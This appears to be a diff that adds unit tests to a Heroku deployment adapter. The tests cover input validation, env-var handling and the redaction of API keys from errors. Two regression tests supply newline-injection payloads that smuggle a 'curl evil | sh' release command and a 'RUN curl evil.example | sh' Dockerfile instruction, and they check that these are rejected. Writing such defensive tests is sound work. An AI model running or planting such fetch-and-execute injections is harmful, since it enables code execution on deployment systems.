@@ -51,6 +51,29 @@ describe("herokuYmlFor", () => {
   test("rejects unsupported shapes", () => {
     expect(() => herokuYmlFor({ target: "cli" })).toThrow(HerokuAdapterError);
   });
+
+  // Regression: a `dockerfilePath` containing a newline could inject arbitrary
+  // top-level YAML sections (e.g. a `release:` block Heroku would execute).
+  test("rejects dockerfile path with newline injection", () => {
+    expect(() =>
+      herokuYmlFor({
+        target: "channel",
+        dockerfilePath: "Dockerfile\nrelease:\n  command: ['curl evil | sh']",
+      }),
+    ).toThrow(HerokuAdapterError);
+  });
+
+  test("rejects dockerfile path with control character", () => {
+    expect(() => herokuYmlFor({ target: "channel", dockerfilePath: "Dockerfile\t" })).toThrow(
+      HerokuAdapterError,
+    );
+  });
+
+  test("rejects empty dockerfile path", () => {
+    expect(() => herokuYmlFor({ target: "channel", dockerfilePath: "" })).toThrow(
+      HerokuAdapterError,
+    );
+  });
 });
 
 describe("appJsonFor", () => {
@@ -86,6 +109,35 @@ describe("appJsonFor", () => {
     });
     expect(a).toBe(b);
     expect(a.indexOf('"ALPHA"')).toBeLessThan(a.indexOf('"ZETA"'));
+  });
+
+  // An env-var entry that is explicitly `undefined` (only reachable from
+  // untyped JS callers) is skipped rather than serialized.
+  test("skips undefined env-var entries", () => {
+    const out = appJsonFor({
+      target: "channel",
+      name: "my-bot",
+      envVars: {
+        KEEP: { value: "1" },
+        DROP: undefined as unknown as { value?: string },
+      },
+    });
+    const parsed = JSON.parse(out);
+    expect(parsed.env).toEqual({ KEEP: { value: "1" } });
+    expect(parsed.env.DROP).toBeUndefined();
+  });
+
+  // When no env vars survive filtering, the `env` key is omitted entirely.
+  test("omits env key when no env vars provided", () => {
+    const parsed = JSON.parse(appJsonFor({ target: "channel", name: "my-bot" }));
+    expect(parsed.env).toBeUndefined();
+  });
+
+  test("includes description when provided", () => {
+    const parsed = JSON.parse(
+      appJsonFor({ target: "channel", name: "my-bot", description: "a demo bot" }),
+    );
+    expect(parsed.description).toBe("a demo bot");
   });
 
   test("respects dyno size and quantity", () => {
@@ -128,6 +180,29 @@ describe("herokuDockerfileFor", () => {
       HerokuAdapterError,
     );
   });
+
+  // Regression: a `baseImage` containing a newline could inject arbitrary
+  // Dockerfile instructions (e.g. a `RUN` directive executed at build time).
+  test("rejects base image with newline injection", () => {
+    expect(() =>
+      herokuDockerfileFor({
+        target: "channel",
+        baseImage: "crewhaus/channel:0.1.0\nRUN curl evil.example | sh",
+      }),
+    ).toThrow(HerokuAdapterError);
+  });
+
+  test("rejects base image with control character", () => {
+    expect(() =>
+      herokuDockerfileFor({ target: "channel", baseImage: "crewhaus/channel:0.1.0\t" }),
+    ).toThrow(HerokuAdapterError);
+  });
+
+  test("rejects empty base image", () => {
+    expect(() => herokuDockerfileFor({ target: "channel", baseImage: "" })).toThrow(
+      HerokuAdapterError,
+    );
+  });
 });
 
 describe("scrubApiKey", () => {
@@ -138,6 +213,9 @@ describe("scrubApiKey", () => {
   });
   test("ignores short keys", () => {
     expect(scrubApiKey("untouched", "abc")).toBe("untouched");
+  });
+  test("passes through when key is undefined", () => {
+    expect(scrubApiKey("untouched", undefined)).toBe("untouched");
   });
 });
 
@@ -193,6 +271,34 @@ describe("deployToHeroku", () => {
     expect(body["region"]).toBe("eu");
   });
 
+  // Custom apiBaseUrl is honored (also documents the SSRF surface: callers
+  // own the base URL, so it must come from trusted config).
+  test("respects custom apiBaseUrl", async () => {
+    let observedUrl = "";
+    const fetchImpl = (async (url: string | URL) => {
+      observedUrl = String(url);
+      return new Response(JSON.stringify({ id: "x", name: "my-bot" }), { status: 201 });
+    }) as unknown as typeof fetch;
+    await deployToHeroku({
+      appName: "my-bot",
+      apiKey: "hrk_testkey_abcdef",
+      apiBaseUrl: "https://api.heroku.example",
+      fetchImpl,
+    });
+    expect(observedUrl).toBe("https://api.heroku.example/apps");
+  });
+
+  test("uses HEROKU_API_KEY env var when apiKey not passed", async () => {
+    process.env[API_KEY_ENV] = "hrk_env_key_abcdef";
+    let authHeader = "";
+    const fetchImpl = (async (_url: string | URL, init?: RequestInit) => {
+      authHeader = (init?.headers as Record<string, string>)["Authorization"] ?? "";
+      return new Response(JSON.stringify({ id: "x", name: "my-bot" }), { status: 201 });
+    }) as unknown as typeof fetch;
+    await deployToHeroku({ appName: "my-bot", fetchImpl });
+    expect(authHeader).toBe("Bearer hrk_env_key_abcdef");
+  });
+
   test("scrubs API key from error bodies", async () => {
     const fetchImpl = (async () =>
       new Response("unauthorized — key hrk_leakingkey_full denied", {
@@ -213,8 +319,61 @@ describe("deployToHeroku", () => {
     expect(caught?.message).toContain("[REDACTED:HEROKU_API_KEY]");
   });
 
+  // The transport-level failure path (fetch rejects) must also scrub the key.
+  test("scrubs API key from transport errors", async () => {
+    const fetchImpl = (async () => {
+      throw new Error("connect ECONNREFUSED while using Bearer hrk_leakingkey_full");
+    }) as unknown as typeof fetch;
+    let caught: Error | undefined;
+    try {
+      await deployToHeroku({
+        appName: "my-bot",
+        apiKey: "hrk_leakingkey_full",
+        fetchImpl,
+      });
+    } catch (err) {
+      caught = err as Error;
+    }
+    expect(caught).toBeInstanceOf(HerokuAdapterError);
+    expect(caught?.message).toContain("Heroku Platform API request failed");
+    expect(caught?.message).not.toContain("hrk_leakingkey_full");
+    expect(caught?.message).toContain("[REDACTED:HEROKU_API_KEY]");
+  });
+
+  // Non-Error throw value from the transport is stringified, not crashed on.
+  test("handles non-Error transport rejection", async () => {
+    const fetchImpl = (async () => {
+      throw "string failure";
+    }) as unknown as typeof fetch;
+    let caught: Error | undefined;
+    try {
+      await deployToHeroku({
+        appName: "my-bot",
+        apiKey: "hrk_testkey_abcdef",
+        fetchImpl,
+      });
+    } catch (err) {
+      caught = err as Error;
+    }
+    expect(caught).toBeInstanceOf(HerokuAdapterError);
+    expect(caught?.message).toContain("string failure");
+  });
+
   test("throws clearly when no API key configured", async () => {
     delete process.env[API_KEY_ENV];
+    let caught: Error | undefined;
+    try {
+      await deployToHeroku({ appName: "my-bot" });
+    } catch (err) {
+      caught = err as Error;
+    }
+    expect(caught).toBeInstanceOf(HerokuAdapterError);
+    expect(caught?.message).toContain("HEROKU_API_KEY is required");
+  });
+
+  // An empty-string env var is treated the same as a missing one.
+  test("throws when HEROKU_API_KEY is empty", async () => {
+    process.env[API_KEY_ENV] = "";
     let caught: Error | undefined;
     try {
       await deployToHeroku({ appName: "my-bot" });
@@ -256,5 +415,43 @@ describe("deployToHeroku", () => {
       fetchImpl,
     });
     expect(record.webUrl).toBe("https://my-bot.herokuapp.com/");
+  });
+
+  // Body that parses as JSON but lacks id/name is rejected (scrubbed).
+  test("rejects JSON response missing id/name", async () => {
+    const fetchImpl = (async () =>
+      new Response(JSON.stringify({ message: "created but weird" }), {
+        status: 201,
+      })) as unknown as typeof fetch;
+    let caught: Error | undefined;
+    try {
+      await deployToHeroku({
+        appName: "my-bot",
+        apiKey: "hrk_testkey_abcdef",
+        fetchImpl,
+      });
+    } catch (err) {
+      caught = err as Error;
+    }
+    expect(caught).toBeInstanceOf(HerokuAdapterError);
+    expect(caught?.message).toContain("missing id/name");
+  });
+
+  // A 2xx response whose body is not JSON surfaces a clear parse error.
+  test("rejects non-JSON success body", async () => {
+    const fetchImpl = (async () =>
+      new Response("<html>not json</html>", { status: 201 })) as unknown as typeof fetch;
+    let caught: Error | undefined;
+    try {
+      await deployToHeroku({
+        appName: "my-bot",
+        apiKey: "hrk_testkey_abcdef",
+        fetchImpl,
+      });
+    } catch (err) {
+      caught = err as Error;
+    }
+    expect(caught).toBeInstanceOf(HerokuAdapterError);
+    expect(caught?.message).toContain("non-JSON body");
   });
 });
